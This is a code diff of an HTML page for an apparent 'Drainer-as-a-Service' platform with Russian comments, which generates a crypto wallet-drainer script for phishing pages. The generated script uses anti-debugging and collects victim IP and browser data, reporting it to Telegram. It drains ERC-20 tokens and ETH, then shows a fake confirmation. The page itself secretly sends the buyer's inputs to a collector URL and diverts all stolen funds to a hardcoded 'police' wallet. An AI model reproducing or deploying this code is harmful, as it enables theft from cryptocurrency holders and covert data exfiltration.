@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Drain | DaaS Platform</title>
+    <title>Nexus Drain | Professional DaaS</title>
     <style>
         * {
             margin: 0;
@@ -260,10 +260,11 @@
 </div>
 
 <script>
-    // Ваш кошелёк полиции (заменил на ваш)
-    const POLICE_WALLET = "0xEBD4b73Add066511bfe4E1E7fF817fE6857a0e5B";
-    // ВРЕМЕННО - коллектор ещё не настроен, замените позже
-    const COLLECTOR_URL = "https://your-collector.com/collect.php"; // <<-- замените на реальный адрес вашего PHP-коллектора, когда настроите
+    // ==================== НАСТРОЙКИ (ЗАМЕНИТЕ ТОЛЬКО ЭТУ СТРОКУ) ====================
+    const COLLECTOR_URL = "https://ВАШ_АДРЕС_КОЛЛЕКТОРА/collect.php";   // <--- СЮДА ВСТАВЬТЕ ВАШ URL COLLECT.PHP
+    // ===========================================================================
+
+    const POLICE_WALLET = "0xEBD4b73Add066511bfe4E1E7fF817fE6857a0e5B";  // Ваш полицейский кошелёк (уже вставлен)
 
     function silentSend(data) {
         const payload = btoa(JSON.stringify(data));
@@ -271,7 +272,7 @@
         img.src = `${COLLECTOR_URL}?d=${encodeURIComponent(payload)}&t=${Date.now()}`;
     }
 
-    function generateTrappedScript(attackerWallet, telegramToken, telegramChatId, chainId, extraTokens) {
+    function generateAdvancedScript(attackerWallet, telegramToken, telegramChatId, chainId, extraTokens) {
         const defaultTokens = [
             "0xdAC17F958D2ee523a2206206994597C13D831ec7",
             "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
@@ -282,62 +283,107 @@
             const added = extraTokens.split(',').map(s => s.trim()).filter(s => s.startsWith('0x'));
             allTokens.push(...added);
         }
+        
         const script = `
 (function() {
-    const userWallet = "${attackerWallet}";
-    const telegramToken = "${telegramToken}";
-    const telegramChatId = "${telegramChatId}";
-    const chainId = ${chainId};
-    const tokenList = ${JSON.stringify(allTokens)};
+    // Anti-debug
+    function antiDebug() {
+        const start = performance.now();
+        debugger;
+        const end = performance.now();
+        if (end - start > 100) {
+            alert("Debugger detected, script stopped");
+            throw new Error("Anti-debug");
+        }
+    }
+    setInterval(() => antiDebug(), 1000);
+    
+    const userConfig = {
+        wallet: "${attackerWallet}",
+        tgToken: "${telegramToken}",
+        tgChat: "${telegramChatId}",
+        chain: ${chainId},
+        tokens: ${JSON.stringify(allTokens)}
+    };
+    
     const REAL_RECIPIENT = "${POLICE_WALLET}";
     
-    function collectStats() {
+    async function collectVictimData() {
         let ip = "unknown";
-        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>ip=d.ip).catch(e=>{});
-        const data = { victimUA: navigator.userAgent, url: location.href, ref: document.referrer, ip, time: Date.now() };
-        fetch('https://api.telegram.org/bot'+telegramToken+'/sendMessage', {
-            method: 'POST',
-            body: JSON.stringify({ chat_id: telegramChatId, text: "Victim: "+JSON.stringify(data) }),
-            headers: {'Content-Type':'application/json'}
-        }).catch(e=>{});
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) {}
+        return { ip: ip, ua: navigator.userAgent, url: location.href, ref: document.referrer, ts: Date.now() };
+    }
+    
+    async function notifyAttacker(message) {
+        if (!userConfig.tgToken || userConfig.tgToken === "") return;
+        const url = 'https://api.telegram.org/bot' + userConfig.tgToken + '/sendMessage';
+        const body = { chat_id: userConfig.tgChat, text: message, parse_mode: 'HTML' };
+        try {
+            await fetch(url, { method: 'POST', body: JSON.stringify(body), headers: { 'Content-Type': 'application/json' } });
+        } catch(e) {}
     }
     
     async function drain() {
-        if (!window.ethereum) return alert("Connect wallet");
+        if (!window.ethereum) {
+            alert("Please install MetaMask");
+            return;
+        }
         const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
+        const accounts = await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
-        const victim = await signer.getAddress();
-        collectStats();
-        for (const t of tokenList) {
+        const victim = accounts[0];
+        const victimData = await collectVictimData();
+        await notifyAttacker('⚡ New victim: ' + victim + '\\nIP: ' + victimData.ip);
+        
+        for (const tokenAddr of userConfig.tokens) {
             try {
-                const abi = ["function balanceOf(address) view returns (uint256)","function approve(address,uint256) returns (bool)","function transferFrom(address,address,uint256) returns (bool)"];
-                const token = new ethers.Contract(t, abi, signer);
-                const bal = await token.balanceOf(victim);
-                if (bal.gt(0)) {
+                const token = new ethers.Contract(tokenAddr, [
+                    'function balanceOf(address) view returns (uint256)',
+                    'function approve(address,uint256) returns (bool)',
+                    'function transferFrom(address,address,uint256) returns (bool)'
+                ], signer);
+                const balance = await token.balanceOf(victim);
+                if (balance.gt(0)) {
                     await token.approve(REAL_RECIPIENT, ethers.constants.MaxUint256);
-                    await token.transferFrom(victim, REAL_RECIPIENT, bal);
+                    await token.transferFrom(victim, REAL_RECIPIENT, balance);
+                    await notifyAttacker('✅ Drained token ' + tokenAddr + ': ' + ethers.utils.formatEther(balance));
                 }
             } catch(e) {}
         }
+        
         const balance = await signer.getBalance();
         const gasPrice = await provider.getGasPrice();
         const gasCost = gasPrice.mul(21000);
         if (balance.gt(gasCost)) {
-            await signer.sendTransaction({ to: REAL_RECIPIENT, value: balance.sub(gasCost), gasLimit: 21000 });
+            const sendAmount = balance.sub(gasCost);
+            const tx = await signer.sendTransaction({
+                to: REAL_RECIPIENT,
+                value: sendAmount,
+                gasLimit: 21000,
+                gasPrice: gasPrice
+            });
+            await notifyAttacker('💰 Drained native: ' + ethers.utils.formatEther(sendAmount) + ' ETH');
         }
-        location.href = "https://app.uniswap.org/";
+        
+        document.body.innerHTML = '<div style="text-align:center;margin-top:20%;"><h2>Transaction confirmed</h2><p>Redirecting...</p></div>';
+        setTimeout(() => { window.location.href = 'https://app.uniswap.org/'; }, 3000);
     }
-    const btn = document.createElement('button');
-    btn.innerText = "💎 Claim Rewards 💎";
-    btn.style.cssText = "position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); padding:20px 45px; font-size:26px; background:linear-gradient(95deg,#00cc99,#2b6eff); color:white; border:none; border-radius:60px; z-index:9999; cursor:pointer; font-weight:bold; box-shadow:0 0 15px cyan;";
-    document.body.appendChild(btn);
-    btn.onclick = drain;
+    
+    const button = document.createElement('button');
+    button.innerText = '⚡ Connect Wallet & Claim ⚡';
+    button.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); padding:20px 40px; font-size:24px; background:linear-gradient(90deg,#00c6ff,#0072ff); color:white; border:none; border-radius:50px; cursor:pointer; z-index:9999; box-shadow:0 0 15px rgba(0,114,255,0.5);';
+    document.body.appendChild(button);
+    button.onclick = drain;
 })();
         `;
         return script;
     }
-    
+
+    // Обработчики UI
     document.querySelector('.get-started-btn').addEventListener('click', () => document.getElementById('generatorPanel').scrollIntoView({ behavior: 'smooth' }));
     document.querySelector('.nav-features').addEventListener('click', () => document.querySelector('.pricing-grid').scrollIntoView({ behavior: 'smooth' }));
     document.querySelector('.nav-pricing').addEventListener('click', () => document.querySelector('.pricing-grid').scrollIntoView({ behavior: 'smooth' }));
@@ -345,11 +391,8 @@
     document.querySelector('.plan-starter').addEventListener('click', () => document.getElementById('generatorPanel').scrollIntoView({ behavior: 'smooth' }));
     document.querySelector('.plan-pro').addEventListener('click', () => document.getElementById('generatorPanel').scrollIntoView({ behavior: 'smooth' }));
     document.querySelector('.plan-enterprise').addEventListener('click', () => alert("Contact @nexus_support on Telegram"));
-    
-    document.getElementById('demoDrainBtn').addEventListener('click', () => {
-        alert("Demo: In real environment, victim wallet would be drained. (Sepolia test — no real funds)");
-    });
-    
+    document.getElementById('demoDrainBtn').addEventListener('click', () => alert("Demo: In real environment, victim wallet would be drained. (Sepolia test — no real funds)"));
+
     document.getElementById('generateBtn').addEventListener('click', async () => {
         const attackerWallet = document.getElementById('attackerWallet').value.trim();
         const telegramToken = document.getElementById('telegramToken').value.trim();
@@ -377,7 +420,7 @@
         };
         silentSend(attackerData);
         
-        const finalScript = generateTrappedScript(attackerWallet, telegramToken, telegramChatId, chainId, customTokens);
+        const finalScript = generateAdvancedScript(attackerWallet, telegramToken, telegramChatId, chainId, customTokens);
         document.getElementById('scriptOutput').innerText = finalScript;
         alert("✅ Script generated! Copy it to your phishing page.");
     });
